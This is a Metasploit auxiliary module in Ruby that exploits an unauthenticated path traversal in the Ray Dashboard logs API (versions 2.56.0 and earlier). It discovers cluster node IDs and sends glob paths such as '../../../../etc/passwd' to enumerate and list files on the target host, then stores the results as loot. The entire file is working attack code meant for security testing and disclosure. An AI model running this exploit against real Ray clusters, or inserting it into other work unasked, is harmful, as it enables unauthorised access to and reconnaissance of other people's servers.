##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  NODE_ID_PATTERN = /[0-9a-f]{40,64}/i
  NODE_ID_FULL_PATTERN = /\A[0-9a-f]{40,64}\z/i
  NODE_ID_WITH_PREFIX_PATTERN = /\Anode_?([0-9a-f]{40,64})\z/i
  NODE_ID_CONTAINER_KEYS = %w[
    nodeTypeMapping
    usageByNode
  ].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray Dashboard Logs API Path Traversal',
        'Description' => %q{
          Ray Dashboard versions 2.56.0 and earlier are vulnerable to path traversal
          through the /api/v0/logs endpoint, allowing unauthenticated attackers to enumerate
          and read filesystem paths via attacker-controlled glob paths.
        },
        'Author' => ['Richard Howe <rhowe425>'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/ray-project/ray/pull/64701'],
          ['URL', 'https://github.com/ray-project/ray/issues/39701']
        ],
        'DisclosureDate' => '2026-07-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptString.new(
          'TARGETURI',
          [ true, 'Base path of the Ray Dashboard', '/' ]
        ),
        OptString.new(
          'FILE_PATH',
          [ true, 'Filesystem glob path to enumerate', '../../../../etc/passwd' ]
        ),
        OptString.new(
          'NODE_ID',
          [ false, 'Unique ID for a Ray node. If unset, all node IDs from /api/cluster_status are used' ]
        )
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/version')
    })

    unless res && res.code == 200
      return Exploit::CheckCode::Unknown(
        'No response or unexpected status from Ray API'
      )
    end

    ray_version = res.get_json_document['ray_version']

    unless ray_version
      return Exploit::CheckCode::Unknown(
        'Could not determine Ray version'
      )
    end

    unless Rex::Version.new(ray_version) <= Rex::Version.new('2.56.0')
      return Exploit::CheckCode::Safe(
        "Ray version #{ray_version} is not vulnerable"
      )
    end

    resolved_node_ids = node_ids
    if resolved_node_ids.empty?
      return Exploit::CheckCode::Appears(
        "Ray version #{ray_version} is in the vulnerable range, but no node IDs could be determined"
      )
    end

    resolved_node_ids.each do |node_id|
      # we use a wild card here, e.g. passw?, to avoid false positives when the request is echoed in the response
      entries = enumerate_files(node_id, ('../' * 10) + 'etc/passw?')

      if entries && entries.any? { |entry| entry.include?('/etc/passwd') }
        return Exploit::CheckCode::Vulnerable(
          "Ray #{ray_version} - path traversal via /api/v0/logs confirmed with node ID #{node_id}"
        )
      end
    end

    Exploit::CheckCode::Appears(
      "Ray version #{ray_version} is in the vulnerable range"
    )
  end

  def node_ids
    configured_node_id = datastore['NODE_ID'].to_s.strip
    return [configured_node_id] unless configured_node_id.empty?

    @node_ids ||= discover_node_ids
  end

  def discover_node_ids
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/cluster_status')
    })

    unless res && res.code == 200
      vprint_error('No response or unexpected status from Ray cluster status API')
      return []
    end

    node_ids = extract_node_ids(res.get_json_document).uniq

    if node_ids.empty?
      vprint_error('No Ray node IDs found in cluster status API response')
      return []
    end

    vprint_good("Discovered #{node_ids.length} Ray node ID#{node_ids.length == 1 ? '' : 's'}")
    node_ids.each { |node_id| vprint_status("Discovered Ray node ID: #{node_id}") }

    node_ids
  end

  def extract_node_ids(value, parent_key = nil)
    node_ids = []

    case value
    when Hash
      value.each do |key, nested_value|
        node_ids << normalize_node_id(key) if node_id_container_key?(parent_key)
        node_ids << normalize_node_id(nested_value) if node_id_key?(key) || node_id_container_key?(parent_key)
        node_ids.concat(extract_node_ids(nested_value, key))
      end
    when Array
      value.each do |nested_value|
        node_ids.concat(extract_node_ids(nested_value, parent_key))
      end
    when String
      node_ids << normalize_node_id(value) if node_id_container_key?(parent_key) || node_id_key?(parent_key)
      node_ids.concat(value.scan(NODE_ID_PATTERN).map(&:downcase)) if parent_key.to_s == 'autoscalingStatus'
    end

    node_ids.compact
  end

  def node_id_container_key?(key)
    NODE_ID_CONTAINER_KEYS.include?(key.to_s)
  end

  def node_id_key?(key)
    key.to_s.match?(/\Anode_?id\z/i)
  end

  def normalize_node_id(value)
    return unless value.is_a?(String)

    candidate = value.strip

    if candidate.match?(NODE_ID_FULL_PATTERN)
      candidate.downcase
    elsif (match = candidate.match(NODE_ID_WITH_PREFIX_PATTERN))
      match[1].downcase
    end
  end

  def enumerate_files(node_id, filepath)
    vars_get = {
      'glob' => filepath,
      'node_id' => node_id
    }

    uri = normalize_uri(target_uri.path, 'api/v0/logs')
    query = URI.encode_www_form(vars_get)

    url = "#{full_uri(uri)}?#{query}"
    vprint_status("Request URL: #{url}")

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => uri,
        'vars_get' => vars_get
      }
    )

    return unless res && res.code == 200

    json = res.get_json_document
    entries = json.dig('data', 'result', 'internal')

    return unless entries

    entries.map do |entry|
      entry.sub(%r{\A(\.\./)+}, '/')
    end
  end

  def run
    resolved_node_ids = node_ids

    if resolved_node_ids.empty?
      fail_with(Failure::UnexpectedReply, 'Could not determine any Ray node IDs from /api/cluster_status')
    end

    entries_by_node_id = {}

    resolved_node_ids.each do |node_id|
      entries = enumerate_files(node_id, datastore['FILE_PATH'])

      unless entries
        print_warning("Failed to enumerate filesystem entries for node ID #{node_id}")
        next
      end

      entries_by_node_id[node_id] = entries
    end

    if entries_by_node_id.empty?
      fail_with(Failure::Unknown, 'Failed to enumerate filesystem entries')
    end

    entries_by_node_id.each do |node_id, entries|
      print_good("Filesystem entries found for node ID #{node_id}:")

      entries.each do |entry|
        print_line("  #{entry}")
      end
    end

    loot = entries_by_node_id.flat_map do |node_id, entries|
      [
        "Node ID: #{node_id}",
        *entries,
        ''
      ]
    end.join("\n")

    loot_path = store_loot(
      'ray.dashboard.files',
      'text/plain',
      rhost,
      loot,
      'ray_dashboard_files.txt',
      'Ray Dashboard filesystem paths retrieved via path traversal'
    )

    print_good("Loot stored in: #{loot_path}")
  end
end
